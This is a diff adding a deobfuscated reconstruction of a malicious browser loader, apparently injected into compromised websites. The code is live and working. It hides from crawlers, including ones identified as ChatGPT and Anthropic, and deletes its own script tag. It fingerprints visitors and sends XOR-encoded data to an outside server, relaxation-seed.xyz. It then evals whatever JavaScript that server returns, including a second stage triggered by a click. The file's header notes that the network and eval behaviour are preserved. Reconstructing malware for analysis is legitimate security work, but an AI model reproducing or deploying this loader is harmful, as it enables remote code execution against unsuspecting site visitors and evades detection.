@@ -1,0 +1,324 @@
+/*
+ * Readable reconstruction of the supplied obfuscated script.
+ *
+ * WARNING:
+ * This version preserves the original network and eval behavior. Running it in
+ * a browser will contact the embedded server and may execute JavaScript
+ * returned by that server.
+ */
+
+(() => {
+    "use strict";
+
+    const API_BASE = "https://relaxation-seed.xyz/x9i32md/w1/";
+
+    const INITIAL_REQUEST_ACTION = "la02";
+    const CLICK_ACTION = "icj1";
+    const CHECK_ACTION = "uf3j";
+    const SIGNAL_ACTION = "sci5";
+
+    const BLOCK_UNTIL_KEY = "am80dq";
+    const DEVICE_ID_KEY = "akx02";
+
+    const INITIAL_DELAY_MS = 500;
+    const CLICK_REQUEST_DELAY_MS = 10;
+
+    const ONE_DAY_MS = 0x5265c00;
+    const BLOCK_DURATION_MS = ONE_DAY_MS * 3;
+
+    const XOR_KEY = new Uint8Array([
+        51, 35, 111, 48,
+        169, 59, 244, 218,
+        154, 152, 90, 8,
+        15, 30, 147, 185
+    ]);
+
+    const BOT_USER_AGENT = new RegExp(
+        [
+            "bot",
+            "crawler",
+            "crawling",
+            "spider",
+            "headless",
+            "facebookexternalhit",
+            "whatsapp",
+            "sogou",
+            "ia_archiver",
+            "chatgpt",
+            "anthropic",
+            "googleother",
+            "lighthouse",
+            "mediapartners"
+        ].join("|"),
+        "i"
+    );
+
+    if (BOT_USER_AGENT.test(navigator.userAgent)) {
+        return;
+    }
+
+    /*
+     * Remove the loader's own script element from the DOM.
+     */
+    const loaderScript = document.currentScript;
+    loaderScript?.parentNode?.removeChild(loaderScript);
+
+    const now = Date.now;
+    const pageStartTime = now();
+    const storage = window.localStorage;
+
+    /*
+     * Stop execution when a previous click caused the loader to suppress
+     * itself for three days.
+     */
+    const blockUntil = storage.getItem(BLOCK_UNTIL_KEY);
+
+    if (blockUntil && Number(blockUntil) > pageStartTime) {
+        return;
+    }
+
+    let visitorId = "";
+
+    /*
+     * Recover or generate a persistent per-browser device identifier.
+     */
+    const deviceId =
+        storage.getItem(DEVICE_ID_KEY) ||
+        crypto.randomUUID();
+
+    storage.setItem(DEVICE_ID_KEY, deviceId);
+
+    const textEncoder = new TextEncoder();
+    const textDecoder = new TextDecoder();
+
+    /*
+     * XOR is used for both request encryption and response decryption.
+     */
+    function xorBytes(bytes) {
+        return new Uint8Array(
+            bytes.map((byte, index) => {
+                return byte ^ XOR_KEY[index % XOR_KEY.length];
+            })
+        );
+    }
+
+    /*
+     * Indirect eval executes returned JavaScript in the global scope.
+     */
+    function executeInGlobalScope(source) {
+        return (0, eval)(source);
+    }
+
+    /*
+     * Send an XOR-encoded JSON payload and decode the XOR-encoded response.
+     */
+    async function callBackend(action, payload) {
+        const encodedPayload = textEncoder.encode(
+            JSON.stringify(payload)
+        );
+
+        const response = await fetch(API_BASE + action, {
+            method: "POST",
+            body: xorBytes(encodedPayload)
+        });
+
+        if (!response.ok) {
+            throw new Error("Backend request failed");
+        }
+
+        const encryptedResponse = new Uint8Array(
+            await response.arrayBuffer()
+        );
+
+        return textDecoder.decode(
+            xorBytes(encryptedResponse)
+        );
+    }
+
+    let initialRequestStartTime = 0;
+    let initialResponseTime = 0;
+
+    /*
+     * Initial visitor registration and environment fingerprinting.
+     */
+    setTimeout(() => {
+        initialRequestStartTime = now();
+
+        callBackend(INITIAL_REQUEST_ACTION, {
+            did: deviceId,
+
+            /*
+             * Full URL of the compromised or embedding page.
+             */
+            u: window.location.href,
+
+            /*
+             * Lowercase window-global names, excluding event-handler
+             * properties such as onclick and onload.
+             */
+            wks: Object.getOwnPropertyNames(window).filter((name) => {
+                return (
+                    name[0] === name[0].toLowerCase() &&
+                    !name.startsWith("on")
+                );
+            })
+        })
+            .then((responseText) => {
+                const response = JSON.parse(responseText);
+
+                initialResponseTime = now();
+                visitorId = response.vid;
+
+                /*
+                 * The backend may return an arbitrary JavaScript stage.
+                 */
+                if (response.js) {
+                    executeInGlobalScope(response.js);
+                }
+            })
+            .catch(() => 0);
+    }, INITIAL_DELAY_MS);
+
+    let clickHandled = false;
+    let trustedMousemoveCount = 0;
+    let trustedClickCount = 0;
+
+    /*
+     * Count genuine browser-generated interaction events.
+     */
+    document.addEventListener("mousemove", (event) => {
+        if (event.isTrusted) {
+            trustedMousemoveCount++;
+        }
+    });
+
+    document.addEventListener("click", (event) => {
+        if (event.isTrusted) {
+            trustedClickCount++;
+        }
+    });
+
+    /*
+     * API exposed to JavaScript returned by the initial controller response.
+     */
+    window.fd5 = {
+        /*
+         * Register a one-time click gate.
+         *
+         * selector:
+         *     CSS selector for the element that must be clicked.
+         *
+         * flowKey:
+         *     Server-provided campaign or flow identifier.
+         *
+         * executionDelayMs:
+         *     Desired interval between the click and execution of the
+         *     returned JavaScript.
+         */
+        cl(selector, flowKey, executionDelayMs) {
+            const target = document.querySelector(selector);
+
+            target?.addEventListener("click", () => {
+                if (clickHandled) {
+                    return;
+                }
+
+                clickHandled = true;
+
+                const clickTime = now();
+
+                /*
+                 * Suppress the loader for three days after this click.
+                 */
+                storage.setItem(
+                    BLOCK_UNTIL_KEY,
+                    String(clickTime + BLOCK_DURATION_MS)
+                );
+
+                setTimeout(() => {
+                    callBackend(CLICK_ACTION, {
+                        vid: visitorId,
+                        did: deviceId,
+
+                        /*
+                         * Initial controller response time.
+                         */
+                        vrms:
+                            initialResponseTime -
+                            initialRequestStartTime,
+
+                        /*
+                         * Trusted mouse and click event counts.
+                         */
+                        mm: trustedMousemoveCount,
+                        dc: trustedClickCount,
+
+                        /*
+                         * Server-selected flow key.
+                         */
+                        fk: flowKey,
+
+                        /*
+                         * Whether the page is visible and focused.
+                         */
+                        vis:
+                            !document.hidden &&
+                            document.hasFocus(),
+
+                        /*
+                         * Time from initial response to user click.
+                         */
+                        ms:
+                            clickTime -
+                            initialResponseTime
+                    })
+                        .then((returnedScript) => {
+                            if (!returnedScript) {
+                                return;
+                            }
+
+                            const remainingDelay =
+                                executionDelayMs
+                                    ? executionDelayMs -
+                                      (now() - clickTime)
+                                    : 0;
+
+                            /*
+                             * Execute the backend-provided second stage.
+                             */
+                            setTimeout(() => {
+                                executeInGlobalScope(
+                                    returnedScript
+                                );
+                            }, remainingDelay);
+                        })
+                        .catch(() => 0);
+                }, CLICK_REQUEST_DELAY_MS);
+            });
+        },
+
+        /*
+         * Ask the backend for a Boolean decision.
+         *
+         * Resolves to true only when the decoded server response is "1".
+         */
+        ch() {
+            return callBackend(CHECK_ACTION, {
+                vid: visitorId,
+                did: deviceId
+            }).then((responseText) => {
+                return Number(responseText) === 1;
+            });
+        },
+
+        /*
+         * Send a backend signal and discard the response.
+         */
+        bl() {
+            return callBackend(SIGNAL_ACTION, {
+                vid: visitorId,
+                did: deviceId
+            }).then(() => {});
+        }
+    };
+})();
